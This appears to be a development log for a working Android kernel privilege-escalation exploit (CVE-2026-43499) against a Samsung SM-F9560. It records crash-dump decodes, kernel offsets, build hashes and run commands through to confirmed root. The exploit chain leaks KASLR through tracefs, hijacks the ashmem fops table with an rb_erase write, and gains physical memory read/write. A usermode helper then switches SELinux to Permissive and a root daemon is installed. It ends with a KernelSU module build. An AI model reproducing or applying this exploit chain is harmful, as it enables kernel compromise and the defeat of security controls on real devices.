`src/targets/q6q-F9560ZCU3DZDP-v15/` + util.c: the gate slot now writes
`put64(p, lock_off + 0x18, task | 1)` (forged task bank | has-waiters)
instead of `SLIDE_LOCK_OWNER_VALUE`, so the deadlock gate can never match
and the chain's post-marker get_task_struct path refcounts the forged
bank. App 138,792 bytes, label
`q6q-F9560ZCU3DZDP-app-production-v15-fake-owner-task`.

Hardware: attempt 1 = gate miss (hits=0, no crash); attempt 2 = kernel
panic, kp14 = `device_logs/kp14-v15crash*` + `device_logs/prev_dump_v15crash.log`
(line 15605):

```text
[1046.068626] ActivityManager:2819 Unable to handle kernel paging request
              at virtual address 00613c9e76a95921
pc: __kmem_cache_alloc_node+0xa8/0x2e8  lr: __kmem_cache_alloc_node+0x64
Call trace: __kmem_cache_alloc_node <- __kmalloc_node <- kvmalloc_node
            <- seq_read_iter <- seq_read <- vfs_read
x24: 68613c9e76a95121 (encoded freelist ptr read from the object)
x9 : 00613c9e76a95921 (decoded = fault address, non-canonical garbage)
x10: 9796974cd55010de (s->random)   x20: ffffff8001cf6900 (cache)
```

A SLUB freelist got corrupted (garbage encoded freeptr), so a later
unrelated allocation (ActivityManager seq_read) faulted. Not yet
concluded whether the corrupting write is in the newly taken owner>1 path
(fake-task refcount/pi_lock dance, all inside the payload fragment by the
bank offsets) or elsewhere; the pi-tree requeue section
(`0xffffffc009122bf0`..`0x122dc4`) was being audited for its rb-tree
writes when analysis stopped. The owner=1 EDEADLK gate finding itself
stands (v14's 8/8 misses + the v8/v9/v10 hits are consistent with it).
The v13 sweep also re-confirmed that shift 6 crashes on the S=3 boots.

### kp14 decoded: the gate-marker write poisoned a live kmalloc-2k freelist

The register dump decodes the corrupted freelist exactly. The faulting
load is `__kmem_cache_alloc_node+0xa8` = `ldr x11, [x9]` where
`x9 = s->offset + untag(x24)`; with `s->offset = 0x800` (from
`0x00613c9e76a95921 - untag(0x68613c9e76a95121) = 0x800`). `x24` is
`c->freelist` itself, which a previous fastpath allocation had set to the
DECODED garbage:

```text
decode:  W ^ s->random ^ swab64(slot_addr) = 0x68613c9e76a95121
         s->random = x10 = 0x9796974cd55010de
solve:   W = 0xfffffffe2906be00 = direct_to_page(0xffffff8a41af8000)
              = the attempt-2 gate trigger's slide_oracle_parent
         slot_addr = 0xffffff8a2c540800 = pipebuf_page_base + 0x800
              = the attempt-2 gate-marker target (oracle base +0x800)
```

(The solve is unique among every fabricated pointer class: only
`parent` yields a canonical slot address.) So attempt 2's
`rb_erase` marker write (`child->__rb_parent_color = parent` stored at
`[slide_oracle_target]`) fired and landed on the oracle page +0x800 鈥?
which is simultaneously the **kmalloc-2k object-0 freeptr slot**: the
pipe ring is a kmalloc-2k object (`KMALLOC_PIPE_INDEX=11`) at page
offset +0x800 (entry 0's `.page` field), and this kernel's kmalloc-2k
cache has `s->offset == 0x800`, so the page's object 0 keeps its
freeptr link exactly at +0x800. Whenever object 0 is free, the marker
overwrites the live freelist link with `parent`; the next kmalloc-2k
allocation decoding that slot produced `0x68613c9e76a95121`, and
ActivityManager's unrelated `seq_read_iter -> kvmalloc_node ->
__kmalloc_node -> __kmem_cache_alloc_node` faulted at 1046s on the
non-canonical pointer. (`rb_erase`'s only other store,
`[parent+0x10/0x18] = target`, hits the payload page's struct-page
page_pool padding 鈥?pre-existing and harmless.)

The v15 owner dance is **exonerated**: the full post-gate path was
traced against the fabricated bank and every store lands inside the
payload fragment (`fake_task+0x40` refcount inc/dec, `fake_task+0x924`
pi_lock/unlock, `fake_lock+0x00` unlock; fragment
`[base-0x1000, base+0xF000)`). `rb_insert_color` is a no-op (the
fabricated payload waiter has `tree_parent = 1` = black-parent
sentinel), and the pi-tree requeue section
(`0xffffffc009122bf0`..`0x122dc4`) is skipped because the stack waiter
is not the lock's leftmost waiter (`cmp x25, x22; b.ne` at `0x122bf4`).

**Correction of the v15 header's EDEADLK gate theory:** the q6q
`rt_mutex_adjust_pi` passes SIX arguments
(`x0=task, w1=0, x2=NULL, x3=next_lock, x4=NULL, x5=task`), matching the
6.9-style signature `(task, chwalk, orig_lock, next_lock, orig_waiter,
top_task)`. The chain saves `x5` at `[sp+8]`, so the deadlock gate
`(lock->owner & ~1) == [sp+8]` compares against **top_task = the real
consumer task** 鈥?it can never fire for owner=1 or fake_task|1. The
clean gate misses instead come from the earlier exit
`cmp x27, [x25+0x38]; b.ne out` (`0x1227b0`): the stale waiter's
`lock` field must equal `next_lock = fake_lock`, which only holds when
the futex pi_state reclaim landed. The ~7% hit rate is that same
reclaim choreography variance; the gate-marker write fires on every
chain run and corrupts entry 0's `.page` regardless, crashing only when
the adjacent kmalloc-2k object 0 happens to be free (stochastic, and
v8/v9/v10's post-hit panics masked it).

### v16: gate marker moved to entry 1 (+0x828), probe to entry 2 (+0x850)

`src/targets/q6q-F9560ZCU3DZDP-v16/` = v15 plus
`APP_P0_ORACLE_SLOT1_GATE`:

- util.c: the gate-slot target adds `sizeof(struct user_pipe_buffer)`
  (`+0x828` = ring entry 1's `.page`) and the probe-slot target adds it
  twice (`+0x850` = entry 2's `.page`). Neither address lies on any
  kmalloc freeptr grid (`+0x800`/`+0x1000`/... for the 2k cache), so
  the marker can no longer overwrite a freelist link.
- pipe.c: the gate pipes are filled with **two** marker pages, and the
  gate verify drains/scans **two** pages (holder tee widened to 2
  slots). The corrupted entry 1 is therefore actually read; entry 0
  still reads `RMG-P0-PIPE`, keeping the changed-pages check intact.
- The verify's trailing one-page re-write then leaves entry 2 active,
  which is exactly what the shifted probe target (+0x850) expects 鈥?
  the same slot-advance logic the old probe target +0x828 relied on
  after entry 0 was drained.
- The v15 owner change (`lock->owner = fake_task | 1`) is kept: its
  dance is payload-internal and it avoids the `wake_up_state(fake_task)`
  path taken when owner <= 1.

Built with NDK r26c (Windows LLVM package; dl.google.com unreachable
from this host, r27c used earlier), API 34 sysroot equivalent flags.
Label `q6q-F9560ZCU3DZDP-app-production-v16-gate-entry1`. Hardware
results below when available.

### v16 hardware: kp14 poison gone (7 clean attempts); kp15 = misplaced-lock chain crash

App 138,984 bytes. Device run (boot `27745878`): attempts 1-7 completed
**cleanly** 鈥?`p0 pipe gate hits=0 changed=0` on every one, zero kernel
faults, no delayed SLUB crash. Attempt 1 ran the chain
(`write_window=1`), so the shifted marker write (+0x828) executed at
least once without poisoning anything; the kp14 freeptr collision is
fixed. Attempts 2-7 reported `write_window=0` (the consumer-side pselect
window did not open; the run accepts the sched trigger anyway via
`APP_ACCEPT_SCHED_TRIGGER`).

Attempt 8 panicked (kp15): `device_logs/kp15-v16crash.log.gz` +
`device_logs/prev_dump_v16crash.log` + `device_logs/f9560-v16-run.log`:

```text
[2179.995803] env:24616 Unable to handle kernel NULL pointer dereference
               at virtual address 0000000000000347
pc : rt_mutex_adjust_prio_chain+0x1ec/0x91c
lr : rt_mutex_adjust_prio_chain+0x130/0x91c
Call trace: rt_mutex_adjust_prio_chain <- rt_mutex_adjust_pi
            <- __sched_setscheduler <- __arm64_sys_sched_setattr
x27: 000000000000030f   x24: ffffff891d6c2400   x25: ffffffc04941bc38
x19: ffffff892ee64b00 (task)   x9/x5 = task
```

`+0x1ec` = the requeue-walk read `ldr x8, [x27, #0x38]` with
`x27 = lock->waiters.rb_leftmost = 0x30f` (garbage). `x24` (lock) =
`0xffffff891d6c2400`, a direct-map payload-page-class address, but its
content is NOT the fabricated bank: `lock->owner & ~1 =
0xffffffc0083af14c` = `__arm64_compat_sys_execve+0x20` (a text address)
and `leftmost = 0x30f`. The chain therefore walked an un-fabricated
lock. Its only pre-walk check (`cmp x27, [x25+0x38]` at `0x1227b0`) is
tautological 鈥?arg3 (`next_lock`) and the compared field are the same
`waiter->lock` read, once in `rt_mutex_adjust_pi` and once in the chain
(the kp10 race shows they can diverge, but normally they match) 鈥?so a
misplaced or stale lock is never rejected.

Conclusion: kp15 is the **placement-miss crash mode** 鈥?the chain ran
against a payload page whose fabricated bank did not land where the
stale waiter's lock word pointed (the reclaim/frag-placement variance
behind the ~7% hit rate; same failure class as the kp10-kp13
stale-waiter crashes), not a regression of the v16 changes. The v16
marker fix itself is validated: seven consecutive attempts without the
kp14 freelist poison, including one full chain run with the marker
write.

Open items: the victim comm `env` (two `env` processes 24614/24616 were
alive at the panic; app processes should be `cve43499-run` 鈥?no
`cve43499-run` appears anywhere in the kp15 dump), and the attempt-8
trigger log lines were lost in the crash, so the pselect/fd geometry for
that attempt is unrecorded. Next candidates, one at a time: (a) re-run
v16 on fresh boots to measure kp15 recurrence; (b) add a pre-trigger
verification of the fabricated lock content (e.g. only arm the sched
trigger when the consumer-side window opened, i.e. require
`write_window=1`); (c) pin the `env` identity from a live `ps` capture
during the next run.

## v17: write_window gate 鈥?gate verified hit, probe reached; kp16 = probe struct-page vmemmap hole

### v17 profile

`src/targets/q6q-F9560ZCU3DZDP-v17/` = v16 plus `APP_REQUIRE_WRITE_WINDOW 1`
and the `slide_app.c` changes:

- `slide_child_trigger_write` arms the trigger only when the consumer-side
  pselect window confirmed open (`write_window=1`, i.e. the pselect
  returned with ready fds after the sched trigger). A window-less attempt
  is reported as a miss with a distinct child exit code, so
  `slide_trigger_physical_slot` fails the attempt and the caller starts a
  fresh reclaim 鈥?the v16 behavior of accepting `sched_ok=1` unconditionally
  (attempts 2-7) is removed for this target.
- New child exit codes: 0 = armed (window opened), 1 = requeue/deadlock
  route failed, 2 = window closed (placement miss), 3 = stale waiter not
  ok. `slide_trigger_physical_state` now logs
  `p0 physical write status=%d exit=%d ok=%d` (raw exit code), and the
  pselect-return line logs `write_window=%d` explicitly.
- All other v16 changes kept (marker +0x828, probe +0x850, two-entry gate
  pipes, fake-task owner). The v17 gate also applies to the FOPS triggers
  (same `slide_trigger_physical_state` path), which is the desired
  behavior once FOPS is reached.

Built with `tools/build-q6q-v17.ps1` (same NDK r26c two-step build):

```text
build/q6q-F9560ZCU3DZDP-v17/cve-2026-43499-app.so   139,096 bytes
  SHA-256 FC7D5C4B715780D6641262FCC6EDC43F996D38D7C8BA6997ED35D1F2D136E732
build/q6q-F9560ZCU3DZDP-v17/cve-2026-43499-root     26,712 bytes
  SHA-256 6E1FE2D2C1BA16E990BD05262A8FEA4C65A1C165F8EF76A498696FEAA344417B
```

Label `q6q-F9560ZCU3DZDP-app-production-v17-write-window-gate` (verified
inside the ELF). Run on boot `2729b0a8-a195-4293-a91d-c27db19327e1`.

### Hardware result: first confirmed gate hit; kp16 at the probe trigger

Attempt 1 (fresh page 1/8): the pselect returned `ret=2 write_window=1`
(the same window-open signature as v16 attempt 1), the trigger was armed
(`p0 physical write status=0 exit=0 ok=1`), and the app proceeded past the
gate verify to the probe slot. The probe trigger is only reachable when
`verify_p0_pipe_oracle_gate()` returns hits=1/changed=0, so **the gate
marker landed and verified for the first time on q6q** 鈥?the v16 marker
target (+0x828), the v15 fake-task owner and the v17 window gate together
produced a confirmed gate hit on the first attempt of the boot.

The probe trigger then panicked the kernel (kp16) at `[2378.891829]`; the
device rebooted (boot id now `881a414a-3e99-4a54-b8a7-c066140951db`,
SELinux enforcing, verified boot untouched). The device-side run log and
binaries were lost to the panic's FS rollback (the whole
`/data/local/tmp/f9560-v17-*` set vanished); the stream relay captured the
run through attempt 1's armed line. Evidence pulled:
`device_logs/kp16-v17crash.log.gz` (`dumpstate_lastkmsg_17`),
`device_logs/kp16-v17crash-extract/`, `device_logs/prev_dump_v17crash.log`.

kp16 register decode (complete dump):

```text
[ 2378.891829]  [ 1:   cve43499-run:25033] Unable to handle kernel paging
                request at virtual address fffffffe0207a010
pc : rb_erase+0x94/0x2f8   lr : rt_mutex_adjust_prio_chain+0x224/0x91c
FSC = 0x06: level 2 translation fault
[fffffffe0207a010] pgd=... pud=... pmd=0000000000000000
x10 = ffffff88aa488850   x9/x8 = fffffffe0207a000
x24 = ffffff8a0b124300   x25 = ffffffc05566bc38   x19 = ffffff8a1fd35dc0
x1  = ffffff8a0b124308   x26 = ffffff8a1fd366e4
```

- The faulting task is `cve43499-run:25033` 鈥?the PROBE trigger child of
  attempt 1 (the gate child was 25025). x10 =
  `0xffffff88aa488000` (that attempt's `pipebuf_page_base`) + `0x850` =
  the v16-shifted probe marker target (ring entry 2's `.page`); the marker
  store (`str x9,[x10]`, `f9000149`) executed immediately before the
  faulting load. x24 = `0xffffff8a0b124300` = attempt-1 `fake_lock`
  (`base 0xffffff8a0b120000 + 0x4300`) 鈥?**the fabricated lock bank was
  correctly placed this time** (the kp15 failure mode did not recur).
- The fault is the parent read `ldr x9, [x8, #0x10]!` (`f8410d09`) with
  parent = `0xfffffffe0207a000` = the struct page of pfn `0x81e80`
  (phys `0x81e80000` = `0x80080000 + 0x1e00000` = the v11+ probe page),
  and `pmd=0` 鈥?the vmemmap 2 MiB section covering pfn
  `[0x80000, 0x88000)` (phys `[0x80000000, 0x88000000)`) is simply
  **absent**, not protected.

### kp16 conclusion: the physical probe is impossible on q6q (vmemmap hole)

The whole kernel Image span (`0x80080000`-`0x824c0000`) lies inside the
unmapped vmemmap section, so **no Image page has a readable struct page on
this target** 鈥?the v10 kp9 fault (pfn `0x82480`, the `0x2400000` probe)
and kp16 (pfn `0x81e80`, the `0x1e00000` zone-core probe) are the same
section, and the v11 probe move could never have helped. The physical
fingerprint probe (rb_erase parent = Image struct page, pipe entry `.page`
= same) is therefore structurally impossible on q6q; the leaked/payload
pages at high phys (30-40 GB) have mapped struct pages, which is why the
gate (parent = `direct_to_page(base)`) works and the probe does not.

The `env` naming question is resolved in substance: this run's crash comm
is `cve43499-run` and no `env`-named process appears anywhere in the kp16
dump 鈥?the kp15 `env` names were an artifact of the previous session's
launch method (an `env` step in the exec chain), not of the payload itself.
(A live `ps` capture during a run is still the definitive check.)

### v18 direction: take the slide from the non-physical route

The KASLR slide no longer needs the physical probe at all. The original
non-physical route (rb_erase marker into the nfnetlink_log name table,
parent = the name string in Image rodata 鈥?both ordinary kernel mappings,
no struct pages 鈥?then the `boot_id` sysctl readback leaks the pointer)
is unaffected by the vmemmap hole; its q6q offsets are already in the
header (`SLIDE_NFULNL_LOGGER_OFF 0x016a6574`, `SLIDE_LOGGERS_0_1_OFF
0x02242a20`, `SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x023762f0`).
`slide_leak_kernel_base()` currently routes every `APP_PHYS_P0_ORACLE`
target straight to `slide_leak_physical_base()`; v18 should run
`slide_read_stext()`/`slide_child_leak_stext()` for the slide and keep the
physical machinery only for FOPS, whose rb-tree parents live in the
payload bank at high phys (the gate already proved those struct pages
readable). The v17 write_window gate stays.

## v18: boot_id slide route 鈥?built and offline-verified, device test pending

### Offline verification of the boot_id leak chain (no device needed)

`tools/verify-q6q-bootid-leak.py` reads the recovered `vmlinux.elf` and
confirms every link of the non-physical route on q6q, byte-for-byte
against the validated e3q/S928U1 record (same offsets, same object
contents):

```text
nfnetlink_log name string @ Image+0x016a6574  = "nfnetlink_log\0"
nfulnl_logger object   @ Image+0x02242a20:
  +0x00 = 0xffffffc0096a6574  (the name pointer)
  +0x08 = 1
  +0x10 = 0xffffffc008f10cd4  (function pointer; gets clobbered by
                               rb_erase's [parent+0x18] re-link - same
                               accepted clobber as e1s/e2s/e3q)
random_table boot_id data-ptr slot @ Image+0x023762f0 = 0xffffffc00a6046e8
  = &sysctl_bootid storage @ Image+0x026046e8   (the slot the marker
    overwrites, then the boot_id read dereferences)
```

The route's rb_erase parent (logger object) and marker target (boot_id
slot) are expressed as LINEAR ALIASES (`P0_DATA_ALIAS_CONST` =
`PAGE_OFFSET + 0x80080000 + offset`), i.e. ordinary mapped+writable Image
`.data` addresses: `bootid_data=ffffff80823f62f0` and
`logger=ffffff80822a2a20` (both match the run log's published p0 profile).
The chain therefore touches **no struct pages**, so the vmemmap hole that
kills the physical probe cannot fault here. The leak self-validates:
`slide_commit_stext` accepts only a canonical `0xffff..` pointer whose
slide equals the danced `SLIDE_P0_OFFSET_CANDIDATES` candidate, aligned to
64 KiB and `<= 0x1f0000`.

### v18 profile

`src/targets/q6q-F9560ZCU3DZDP-v18/` = v17 plus:

- `APP_SLIDE_BOOTID_ROUTE 1`: `slide_leak_kernel_base()` tries the boot_id
  route first 鈥?direct `boot_id` read, then a fresh
  `PAGE_PAYLOAD_SLIDE` reclaim plus the pselect/requeue dance (forked
  child, `slide_child_leak_stext`) over all 32 slide candidates 鈥?and
  only falls back to the physical probe if it fails. New globals
  `slide_bootid_route` / `slide_bootid_slide_done`.
- `prepare_slide_pselect_fdsets` switches the fd-set words to
  `tree_pc=logger_alias+p0`, `tree_left=bootid_slot_alias+p0`,
  `pi_pc/pi_left` likewise, when `slide_bootid_route` is set.
- `APP_FOPS_REUSE_VERIFIED_PAGE` and `APP_FOPS_DATA_ALIAS_DIAG_ONLY` /
  `APP_FOPS_DEFER_ALIAS_READBACK` are undefined: the alias verification's
  probe slot used `direct_to_page(data_addr(ASHMEM_MISC_FOPS))` 鈥?an Image
  struct page inside the vmemmap hole 鈥?so the FOPS stage now goes straight
  to the production geometry (parent = `fake_fops` in the payload bank,
  target = `data_addr(ASHMEM_MISC_FOPS)`), which is the proven e2s write
  graph and involves no struct pages. Fresh FOPS prepare (new pipe ring +
  new FOPS payload page) replaces the verified-page reuse.
- The fresh-P0-session gate accepts a boot_id-sourced slide; the v17
  write_window gate is scoped to vmemmap-parent triggers (the slide-stage
  markers) while the FOPS production trigger keeps the e2s-proven
  `sched_ok` acceptance (`window_gated=%d` logged per trigger).

Built with `tools/build-q6q-v18.ps1` (same NDK r26c two-step build, clean):

```text
build/q6q-F9560ZCU3DZDP-v18/cve-2026-43499-app.so   154,248 bytes
  SHA-256 C98F6ABF35B9598C48AC5933CD781F06BF83EFA0EC25BBC8829B6FC02513A8BE
build/q6q-F9560ZCU3DZDP-v18/cve-2026-43499-root     26,712 bytes
  SHA-256 6E1FE2D2C1BA16E990BD05262A8FEA4C65A1C165F8EF76A498696FEAA344417B
```

Label `q6q-F9560ZCU3DZDP-app-production-v18-bootid-slide` (verified inside
the ELF). **Not yet run on hardware** 鈥?the device was taken away mid-day;
the push/run step is the only remaining action.

### v18 device test plan (when the device is back)

1. `adb push` both artifacts to `/data/local/tmp` as `f9560-v18-app.so` /
   `f9560-v18-root`, `chmod 755`, then run the usual
   `./f9560-v18-root --run-payload ./f9560-v18-app.so ...` command and
   watch for `slide boot_id attempt=N/32` lines and a
   `slide-kaslr-ok source=pselect` (expected: the candidate that equals the
   boot's slide commits on the first dance it lands; the loop stops there).
2. Expected risks to watch in the dumps: (a) the dance's chain still walks
   the reclaimed bank, so a placement miss can still crash (kp15-class,
   window-independent 鈥?the boot_id dance has no pre-trigger placement
   check; the leak's commit validation is the post-hoc gate); (b) the
   logger-object `+0x10/+0x18` clobber is shared with the validated ports
   and assumed harmless.
3. After the slide commits, the FOPS stage prepares fresh and fires the
   production trigger (`parent=fake_fops`, `target=data_addr(ASHMEM_MISC_FOPS)`,
   sched_ok acceptance); success = fops table hijack + physrw + root.
4. Capture a live `ps -A` snapshot during the run to close the kp15 `env`
   naming question definitively.

## v18/v19/v20/v21 device session: kp17, kp18 decoded, then ROOT (q6q rooted)

### v18 hardware (boot 881a414a): kp17 = the kp10 zeroed-word anomaly, reproduced

The v18 boot_id dance ran 17 candidates fully clean (pselect/requeue/sched
trigger all green 鈥?the dance itself is reliable) and every boot_id read
returned the real UUID (the marker never landed). Attempt 18
(p0_offset=0x110000) panicked (kp17 = `dumpstate_lastkmsg_18` /
`device_logs/kp17-v18crash*`):

```text
[ 3214.853496]  [ 1: cve43499-run:12484] NULL pointer dereference at 0
pc : _raw_spin_trylock+0x1c/0xa4   lr : rt_mutex_adjust_prio_chain+0x130
x27 = 0xffffff8045144200  (fake_lock, adjust_pi's read - correct)
x3  = same                  (next_lock arg - correct)
x24 = 0                    (the chain's re-read of [waiter+0x38] - ZEROED)
x25 = 0xffffffc05287bc38   (stale waiter at 0xc38, S=3 geometry intact)
```

This is the kp10 "unidentified writer" anomaly reproduced exactly: the word
was zeroed between the two reads. The chain engages only stochastically
(~1/18 here, matching the documented ~7% reclaim choreography), so a blind
32-candidate boot_id loop cannot work 鈥?each engagement carries the crash
risk and a wrong-candidate marker write would corrupt Image .data. The
live `ps` snapshot during the run shows the whole process tree
(helper 鈫?payload 鈫?exploit 鈫?trigger children, all `f9560-v18-root`
argv; the kernel comm of the dance children is `cve43499-run` per the
dump) 鈥?the kp15 `env` naming is confirmed to be the previous session's
launch artifact. (No `env` process exists in this run's dump.)

### v19 hardware (boot e371f19b): tracefs slide works; kp18 = the direct-map hole

`src/targets/q6q-F9560ZCU3DZDP-v19/` = v18 + `APP_SLIDE_TRACEFS_ROUTE`
(the passive sched_blocked_reason tracepoint leak 鈥?shell holds the
`readtracefs` group and the event files are world-accessible on-device).
Hardware result:

```text
slide tracefs caller=ffffffc00815b1a0 candidate=00080000
slide-kaslr-ok source=tracefs base=ffffffc008080000 slide=0000000000080000
```

**The first successful KASLR leak on q6q, obtained passively in seconds
with zero chain involvement.** The run then reached the FOPS production
trigger and panicked (kp18 = `dumpstate_lastkmsg_19` /
`device_logs/kp18-v19crash*`):

```text
[ 550.838769]  [ 1: cve43499-run:22545] paging request at ffffff80824bb5b0
pc : rb_erase+0x8c/0x2f8   (the marker store, str x9,[x10], WnR=1)
FSC 0x05 level 1 translation fault; pgd=0
```

The fault VA = `data_addr(ASHMEM_MISC_FOPS)` = the LINEAR ALIAS of the
Image .data fops slot (phys 0x824bb5b0), with an EMPTY pgd. kp18 therefore
proves on hardware that **the DIRECT MAP has the same hole as the vmemmap:
phys [0x80000000, 0x88000000) 鈥?the whole Image span 鈥?is unmapped in BOTH
maps**. The v10 note claiming Image symbols 鈮?0x16a0000 are "linearly
readable" was never hardware-verified and is wrong. Every Image access on
q6q must use the CANONICAL (text) mapping. This also kills the boot_id
route for good (its marker target is a linear alias).

### v20 hardware (boot efa0a2ae): canonical addressing 鈥?full chain to the UMH

`src/targets/q6q-F9560ZCU3DZDP-v20/` = v19 minus the boot_id route, with
`text_addr()` everywhere the FOPS/root flow touches Image .data (fops
targets, configfs read/write targets, root selinux/wq slots, cache-gate
reads). Hardware result 鈥?the deepest clean run ever:

```text
slide tracefs ... slide=00010000
app fops slide route parent=ffffff8a40f49000 target=ffffffc00a3cb5b0  (canonical)
pselect returned prod_stack=1 ret=5 write_window=1   (the FOPS marker write)
cfi write ret=35 / cfi read ret=35                  (fops hijack + readback OK)
cfi restoring misc_fops value=ffffffc0093e1140       (original ashmem_fops)
pipe caches normal2k=... cgroup2k=... selected=ffffff8001cf7100
phys step probed read/write/read64 done ok=1         (pipe physrw installed)
root umh queued wq=... writes=1/1/1/1/1              (selinux write + work queued)
root umh result wake=1 complete=1 retval=0 socket=1  (UMH ran as root)
root p0 reference holder ready=0                     <-- the only failure
app fops slide attempt=1/8 verified=0 step=8 errno=111
```

No kernel crash; the device stayed up with **SELinux flipped to Permissive**
(the canonical selinux_state.enforcing write worked and survived). The only
gap: the root daemon waits for the p0-reference keeper (spawned only by the
gate-verify flow, which the FOPS path never runs), so the hold handoff
timed out (step=8).

### v21: keeper wired into the FOPS flow 鈥?ROOT ACHIEVED (boot 1f2a3f7b)

`src/targets/q6q-F9560ZCU3DZDP-v21/` spawns `spawn_p0_ref_keeper` in
`try_cfi_stage` right after the physrw install (the transfer falls back to
a dup of the physrw pipe read end when no gate tee-holder exists). After a
reboot (the session is single-use per boot), the run:

```text
slide tracefs caller=ffffffc00828b1a0 candidate=001b0000
slide-kaslr-ok source=tracefs base=ffffffc0081b0000 slide=00000000001b0000
app fops slide route ... target=ffffffc00a56b5b0  (canonical)
pselect returned prod_stack=1 ret=4 write_window=1
cfi write ret=35 / cfi read ret=35
phys step probed read/write/read64 done ok=1
p0 reference keeper pid=21447 pipe=216
root umh queued ... writes=1/1/1/1/1
root umh result wake=1 complete=1 retval=0 socket=1
root p0 reference holder ready=1
app fops slide attempt=1/8 triggered=1 verified=1 step=0 errno=0
pipe-physrw-summary pid=14766 done=1 root=1 kaslr=1 base=ffffffc0081b0000 slide=00000000001b0000
pipe physrw pid=14766 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
stability keeper pid=21451 retaining reclaimed kernel pages
exploit completed attempt=1/1          (exit 0, no crash)
```

Post-run verification on the live device:

```text
getenforce            -> Permissive
ps: cve43499-roothold + f9560-v21-root daemon processes alive
/data/local/tmp/temp_su.sock exists
./f9560-v21-root -c 'id; getenforce; echo PROOF > /data/root_proof.txt'
  -> uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
  -> Permissive
  -> -rw-r--r-- 1 root root 6 ... /data/root_proof.txt
```

**q6q (SM-F9560 / F9560ZCU3DZDP) is rooted.** The final chain: KernelSnitch
mm leak 鈫?sk_buff reclaim 鈫?tracefs passive KASLR leak 鈫?sched-trigger FOPS
production write (rb_erase marker to the canonical ashmem_misc fops slot) 鈫?
ashmem/configfs fops hijack 鈫?pipe physrw 鈫?workqueue UMH 鈫?root su daemon
with the p0 references. The su client convention is
`./f9560-v21-root -c '<command>'` (the daemon execs sh with argv[0]
replaced).

Artifacts (all built with the fixed two-step scripts 鈥?the app link now
takes an explicit object list; the v18 .so had accidentally linked a stale
`su_daemon.o`, which was inert dead code):

```text
build/q6q-F9560ZCU3DZDP-v19/cve-2026-43499-app.so  139,496 bytes
  SHA-256 0E6E4E53CB539362F49FAB1758B130729A48A36058245E0065A92F7F3C804DE0
build/q6q-F9560ZCU3DZDP-v20/cve-2026-43499-app.so  137,568 bytes
  SHA-256 2C24CB5A7C5332559E25315E8ED2A9ED0B103A51D897E1F6A29916977ABDE71C
build/q6q-F9560ZCU3DZDP-v21/cve-2026-43499-app.so  137,680 bytes
  SHA-256 3BD0395C8552FE3355369F2F4D7C01F386F14DCB6D423A87D8402A389D45B40B
  (root helper unchanged 26,712 bytes / 6E1FE2D2... across v17-v21)
```

Open items carried forward: the kp10/kp17 zeroed-waiter-word anomaly (the
"unidentified writer" between the chain's two reads) is still unexplained
and remains the only observed crash class in the sched-trigger dance; the
v21 run is the first full success and its per-boot reliability (the
stochastic engagement of the chain, ~7-20%) still needs repeat runs to
characterize.

## KernelSU adaptation for q6q (in progress)

The exploit root is not the same as KernelSU. KernelSU proper needs a
per-firmware pair 鈥?an exact-vermagic module plus a late-load binary 鈥?built from KernelSU v3.2.5 + the Samsung KDP/RKP/DEFEX patch:

- required vermagic: `6.1.145-android14-11-3254009-abF9560ZCU3DZDP`
  (the E3Q pair is `鈥?33419968-abS928USQS6DZF2` and must NOT be reused);
- the late-load mechanism itself already exists in the v21 root daemon
  (`./f9560-v21-root --late-load`, `.ksud-stage` staging), so only the
  module + ksud binaries are missing;
- Root My Galaxy app integration needs the support feed registration
  (`support/targets-v3.json`) plus the release payload in
  `artifacts/q6q-F9560ZCU3DZDP/` 鈥?not done yet.

### Build environment status and workarounds (host-side)

- Docker/WSL: not installed yet (the .ko build needs the DDK container
  `ghcr.io/ylarod/ddk-min:android14-6.1-20260313`); `tools/build-q6q-kernelsu-ko.ps1`
  contains the complete post-Docker procedure (build with the exact q6q
  release string, in-container check_symbol against the recovered
  `vmlinux.elf`, host-side `audit_module_against_target.py`, KO asset swap,
  ksud rebuild).
- KernelSU source: cloned `build/KernelSU-q6q/KernelSU` @ v3.2.5 commit
  `b0bc817b4e966aa6aa830834eaf6ef765d821d40` (matches the kernelsu/README
  record exactly), Samsung patch applied cleanly.
- Host TLS: the Windows schannel credential store is broken
  (SEC_E_NO_CREDENTIALS on every HTTPS host; PowerShell/curl/cargo's
  libcurl all fail). Workarounds: git `-c http.sslBackend=openssl`
  (+ `GIT_CONFIG_GLOBAL` pointing at `.tools/gitconfig` for cargo's
  git-fetch-with-cli), Python urllib (OpenSSL) for downloads, and
  `tools/cargo-ssl-proxy.py` (a local OpenSSL CONNECT proxy on
  127.0.0.1:8888) with `CARGO_HTTP(S)_PROXY` for cargo's crates.io access.
- Rust: rustup is blocked by the same TLS issue and by the file sandbox
  (user-profile writes denied), so a linked toolchain
  `.tools/rust-q6q` was assembled in the workspace: junctions to the real
  stable toolchain (bin/etc/rustlib-x86_64) + the manually downloaded
  `rust-std-1.96.1-aarch64-linux-android` extracted into
  `lib/rustlib/aarch64-linux-android`; builds pass
  `RUSTFLAGS=--sysroot .tools/rust-q6q` and the NDK r26c clang as the
  linker. The hello-world aarch64-linux-android compile was verified.

### KernelSU pair built (Docker): module + ksud ready for late-load test

With Docker Desktop installed, the complete q6q KernelSU pair was built and
published:

```text
kernelsu/android14-6.1_kernelsu-q6q-F9560ZCU3DZDP-kdp.ko  400,200 bytes
  SHA-256 71A11D1C8DC671925C4A0E498F02B8AB42A595DC2F1259F89D1F2CE7964DEC7F
kernelsu/ksud-q6q-F9560ZCU3DZDP-kdp                       4,767,984 bytes
  SHA-256 968294F4638F9A77FD9C60B26D8E85B63E9B714D34035386E0A75D16BF465F47
```

Build record: the module was built in
`ghcr.io/ylarod/ddk-min:android14-6.1-20260313` with the exact release
string substituted (`vermagic: 6.1.145-android14-11-3254009-abF9560ZCU3DZDP
SMP preempt mod_unload modversions aarch64`), KernelSU v3.2.5 + the Samsung
patch, CONFIG_KSU=m + KDP/RKP/DEFEX=y, KernelSU version 32525.
check_symbol passed against the recovered q6q `vmlinux.elf`, and
`audit_module_against_target.py --manual-relocation` reported 209 undefined
symbols, 0 missing from the target table, 0 CRC mismatches, 0 module
version entries (73 resolved through kallsyms). ksud was rebuilt in the
same container (rustup 1.96.1 + aarch64-linux-android target, DDK clang
linker against the mounted NDK sysroot, bindgen fed the DDK generated-uapi
headers plus 19 asm shims), embedding the stripped q6q module (rust-embed
compression feature; runtime verification on device).

Device test plan (late-load, when the device is back):

